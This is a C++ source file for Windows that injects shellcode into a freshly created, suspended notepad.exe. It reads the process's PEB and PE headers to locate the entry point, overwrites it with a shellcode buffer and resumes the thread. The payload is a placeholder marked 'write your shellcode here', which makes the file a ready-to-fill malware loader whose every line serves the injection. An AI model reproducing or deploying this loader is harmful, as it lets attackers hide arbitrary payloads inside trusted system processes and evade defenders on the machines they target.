#include <iostream>
#include <windows.h>
#include <winternl.h> // Includes definitions for PEB and PROCESS_BASIC_INFORMATION

using namespace std;

// Define function pointer for ZwQueryInformationProcess since we load it dynamically
typedef NTSTATUS(NTAPI* pZwQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

int main(){
    

unsigned char shellcode[] = "\xCC\xCC\xCC\xCC"; //write your shellcode here

    // ---------------------------------------------------------
    // STEP 1: Create the target process in a suspended state
    // ---------------------------------------------------------

    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi))
    {
        cout << "[-] Failed to create process. Error: " << GetLastError() << endl;
        return 1;
    }

    cout << "[1] Created suspended 'notepad.exe' with ProcId " << pi.dwProcessId << endl;

    // ---------------------------------------------------------
    // STEP 2: Get the address of the Process Environment Block (PEB)
    // ---------------------------------------------------------

    // Load ntdll.dll to get ZwQueryInformationProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pZwQueryInformationProcess ZwQueryInfoProcess =
        (pZwQueryInformationProcess)GetProcAddress(hNtdll, "ZwQueryInformationProcess");

    if (!ZwQueryInfoProcess) {
        cout << "[-] Could not resolve ZwQueryInformationProcess." << endl;
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength = 0;

    ZwQueryInfoProcess(
        pi.hProcess,
        (PROCESSINFOCLASS)0,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    cout << "[2] PEB is at 0x" << hex << pbi.PebBaseAddress << endl;

    // ---------------------------------------------------------
    // STEP 3: Extract the Image Base Address from the PEB
    // ---------------------------------------------------------

    // In x64, the ImageBaseAddress is at PEB + 0x10.
    PVOID imageBaseAddress = 0;
    PVOID pebAddress = pbi.PebBaseAddress;
    PVOID ptrToImageBase = (PSTR)pebAddress + 0x10; // Pointer arithmetic
    SIZE_T bytesRead = 0;

    ReadProcessMemory(
        pi.hProcess,
        ptrToImageBase,
        &imageBaseAddress,
        sizeof(PVOID), // Reading a pointer (8 bytes on x64)
        &bytesRead
    );

    cout << "[3] Image Base Address is 0x" << hex << imageBaseAddress << endl;

    // ---------------------------------------------------------
    // STEP 4: Read the PE structure to find the EntryPoint address
    // ---------------------------------------------------------

    char buffer[0x200]; // Read first 512 bytes
    ReadProcessMemory(
        pi.hProcess,
        imageBaseAddress,
        buffer,
        0x200,
        &bytesRead
    );

    // Parse PE Headers to find EntryPoint
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD64)buffer + dosHeader->e_lfanew);

    // Calculate absolute entry point address
    DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    LPVOID entryPointAddress = (LPVOID)((DWORD64)imageBaseAddress + entryPointRVA);

    cout << "[4] Entry Point is 0x" << hex << entryPointAddress << endl;

    // ---------------------------------------------------------
    // STEP 5: Write shellcode at EntryPoint
    // ---------------------------------------------------------

    SIZE_T bytesWritten = 0;

    WriteProcessMemory(
        pi.hProcess,
        entryPointAddress,
        shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    cout << "[5] Wrote shellcode to Entry Point" << endl;

    // ---------------------------------------------------------
    // STEP 6: Resume the target process
    // ---------------------------------------------------------

    ResumeThread(pi.hThread);

    cout << "[6] Resumed process thread" << endl;

    // Cleanup handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
